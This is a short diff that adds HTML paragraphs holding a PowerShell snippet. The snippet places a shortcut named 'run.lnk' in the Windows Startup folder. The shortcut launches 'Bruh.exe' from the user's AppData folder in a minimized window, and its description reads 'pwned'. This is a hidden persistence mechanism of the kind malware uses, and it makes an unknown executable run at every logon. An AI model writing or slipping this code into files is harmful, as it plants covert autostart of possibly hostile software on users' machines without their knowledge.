@@ -1,0 +1,9 @@
+<p></p>
+
+<p>$ComObj = New-Object -ComObject WScript.Shell</p>
+<p>$ShortCut = $ComObj.CreateShortcut("$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.lnk")</p>
+<p>$ShortCut.TargetPath = "$Env:USERPROFILE\AppData\Roaming\Bruh.exe"</p>
+<p>$ShortCut.Description = "pwned"</p>
+<p>$ShortCut.FullName</p>
+<p>$ShortCut.WindowStyle = 7</p>
+<p>$ShortCut.Save()</p>
